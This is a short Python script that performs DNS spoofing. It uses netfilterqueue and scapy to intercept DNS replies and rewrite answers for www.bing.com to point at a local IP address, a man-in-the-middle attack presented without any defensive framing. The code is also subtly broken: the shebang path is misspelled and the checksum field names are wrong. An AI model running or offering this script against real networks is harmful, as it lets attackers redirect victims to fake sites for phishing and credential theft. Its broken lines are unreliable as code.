#!/usrbin/evn python
import netfilterqueue
import scapy.all as scapy


def process_packet(packet):
    http_packet = scapy.IP(packet.get_payload())
    if http_packet.haslayer(scapy.DNSRR):
        qname = http_packet[scapy.DNSQR].qname
        if "www.bing.com" in qname.decode():  # string expected hence .decode()
            print("[+] Spoofing target...")
            answer = scapy.DNSRR(rrname=qname, rdata="192.168.100.158")
            http_packet[scapy.DNS].an = answer
            http_packet[scapy.DNS].ancount = 1

            del http_packet[scapy.IP].len
            del http_packet[scapy.IP].chksm
            del http_packet[scapy.UDP].chksm
            del http_packet[scapy.UDP].len

            packet.set_payload(bytes(http_packet))  # expected output is bytes

    packet.accept()


queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)
queue.run()
